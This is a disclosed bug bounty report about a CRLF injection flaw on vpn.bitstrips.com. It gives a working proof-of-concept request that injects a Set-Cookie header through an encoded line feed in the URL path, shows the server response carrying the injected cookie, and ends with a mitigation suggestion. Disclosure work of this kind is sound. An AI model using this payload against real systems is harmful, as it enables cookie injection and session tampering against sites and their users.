# CRLF Injection at vpn.bitstrips.com

## Report Details
- **Report ID**: 237357
- **URL**: https://hackerone.com/reports/237357
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-06-06T20:03:52.395Z
- **Disclosed**: 2017-06-15T23:28:22.360Z

## Reporter
- **Username**: wplus
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: snapchat

## Vulnerability Information
HI

I found that the site https://vpn.bitstrips.com/ is vulnerable to a CRLF Injection.
By injecting a Carriage Return and Line Feed character, we are able to make the server issue a set-cookie header.

GET Request :
```

https://vpn.bitstrips.com/__session_start__/%0aSet-Cookie:malicious_cookie1

Host: vpn.bitstrips.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
X-OpenVPN: 1
X-CWS-Proto-Ver: 2
Referer: https://vpn.bitstrips.com/?src=connect
Content-Length: 29
Cookie: openvpn_sess_73209e0b8ad597c3861a05a79e873389=e769bd6ab9896e586227df60f33836f0
Connection: keep-alive

```
Response:
```
HTTP/1.1 302 Found
Transfer-Encoding: chunked
Date: Tue, 06 Jun 2017 20:00:36 GMT
Content-Type: text/html; charset=UTF-8
Location: https://vpn.bitstrips.com/
Set-Cookie: malicious_cookie1
Server: OpenVPN-AS
```

As can be seen in the response, the server will issue a Set-Cookie header with an arbitrary value and that cookie will be set on the client.

To mitigate this issue, the application should strip out any input which contains the %0d%0a URL encoded characters.


## Attachments
No attachments
